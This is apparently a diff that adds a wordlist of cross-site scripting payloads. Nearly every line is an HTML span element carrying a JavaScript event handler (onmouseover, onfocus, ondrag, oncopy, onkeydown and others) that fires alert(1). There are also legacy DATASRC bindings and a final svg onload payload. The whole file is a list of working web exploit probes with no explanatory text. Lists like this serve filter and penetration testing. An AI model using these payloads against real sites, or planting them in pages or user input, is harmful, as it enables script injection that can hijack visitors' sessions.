@@ -1,0 +1,36 @@
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<span draggable="true" ondrag="alert(1)">test</span>
+<span draggable="true" ondragend="alert(1)">test</span>
+<span draggable="true" ondragenter="alert(1)">test</span>
+<span draggable="true" ondragleave="alert(1)">test</span>
+<span draggable="true" ondragstart="alert(1)">test</span>
+<span id=x tabindex=1 onactivate=alert(1)></span>
+<span id=x tabindex=1 onbeforeactivate=alert(1)></span>
+<span id=x tabindex=1 onbeforedeactivate=alert(1)></span><input autofocus>
+<span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>
+<span id=x tabindex=1 onfocus=alert(1)></span>
+<span id=x tabindex=1 onfocusin=alert(1)></span>
+<span onbeforecopy="alert(1)" contenteditable>test</span>
+<span onbeforecut="alert(1)" contenteditable>test</span>
+<span onbeforepaste="alert(1)" contenteditable>test</span>
+<span onblur=alert(1) tabindex=1 id=x></span><input autofocus>
+<span onclick="alert(1)">test</span>
+<span oncontextmenu="alert(1)">test</span>
+<span oncopy="alert(1)" contenteditable>test</span>
+<span oncut="alert(1)" contenteditable>test</span>
+<span ondblclick="alert(1)">test</span>
+<span onfocusout=alert(1) tabindex=1 id=x></span><input autofocus>
+<span onkeydown="alert(1)" contenteditable>test</span>
+<span onkeypress="alert(1)" contenteditable>test</span>
+<span onkeyup="alert(1)" contenteditable>test</span>
+<span onmousedown="alert(1)">test</span>
+<span onmouseenter="alert(1)">test</span>
+<span onmouseleave="alert(1)">test</span>
+<span onmousemove="alert(1)">test</span>
+<span onmouseout="alert(1)">test</span>
+<span onmouseover="alert(1)">test</span>
+<span/onmouseover=confirm(1)>xss
+<span onmouseup="alert(1)">test</span>
+<span onpaste="alert(1)" contenteditable>test</span>
+</span></span><svg onload="alert(1976)//“ #"="">
